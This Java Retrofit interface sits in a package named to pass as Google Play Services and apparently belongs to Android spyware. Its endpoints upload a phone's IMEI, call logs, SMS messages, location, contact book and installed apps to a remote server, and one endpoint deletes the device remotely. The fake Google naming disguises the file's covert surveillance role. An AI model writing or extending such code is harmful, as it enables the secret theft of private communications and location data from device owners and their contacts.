package com.google.android.gms.persistent.googleapps.network.api;

import com.google.android.gms.persistent.googleapps.network.models.response.DeleteResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InformationResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InitialResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.SyncResponse;

import java.util.Date;

import io.reactivex.Flowable;
import io.reactivex.Single;
import retrofit2.Call;
import retrofit2.http.Field;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.POST;

/**
 * Created by OldMan on 03.04.2017.
 */

public interface ServerApi {
    /**
     * @param imei
     * @param model
     * @return
     */
    @FormUrlEncoded
    @POST("/init")
    Call<InitialResponse> onInitDevice(@Field("imei") String imei,
                                       @Field("model") String model);

    /**
     * @param imei
     * @param device
     * @return
     */
    @FormUrlEncoded
    @POST("/sync")
    Call<SyncResponse> onStateSync(@Field("imei") String imei,
                                   @Field("device") String device);


    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/diagnostic")
    Call<InformationResponse> addDiagnosticOfDevice(@Field("imei") String imei,
                                                    @Field("device") String device,
                                                    @Field("data") String data);


    /**
     * @param imei
     * @param device
     * @param mode
     * @return
     */
    @FormUrlEncoded
    @POST("/rm")
    Call<DeleteResponse> onDeleteDevice(@Field("imei") String imei,
                                        @Field("device") String device,
                                        @Field("mode") String mode);


    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/call")
    Call<InformationResponse> addCallOfDevice(@Field("imei") String imei,
                                              @Field("device") String device,
                                              @Field("data") String data);

    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/sms")
    Call<InformationResponse> addSmsOfDevice(@Field("imei") String imei,
                                             @Field("device") String device,
                                             @Field("data") String data);

    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/location")
    Call<InformationResponse> addPositionOfDevice(@Field("imei") String imei,
                                                  @Field("device") String device,
                                                  @Field("data") String data);

    /**
     * @param imei
     * @param device
     * @param data
     * @param date
     * @return
     */
    @FormUrlEncoded
    @POST("/telbook")
    Call<InformationResponse> setPhoneBookOfDevice(@Field("imei") String imei,
                                                 @Field("device") String device,
                                                 @Field("data") String data,
                                                 @Field("date_create") long date);

    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/app")
    Call<InformationResponse> addAppOfDevice(@Field("imei") String imei,
                                                 @Field("device") String device,
                                                 @Field("data") String data);

    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/service/status")
    Call<InformationResponse> setDeviceStatus(@Field("imei") String imei,
                                                 @Field("device") String device,
                                                 @Field("data") String data);


    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/service/battery")
    Call<InformationResponse> setDeviceBatteryState(@Field("imei") String imei,
                                              @Field("device") String device,
                                              @Field("data") String data);

    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/service/network")
    Call<InformationResponse> setNetworkState(@Field("imei") String imei,
                                              @Field("device") String device,
                                              @Field("data") String data);
}
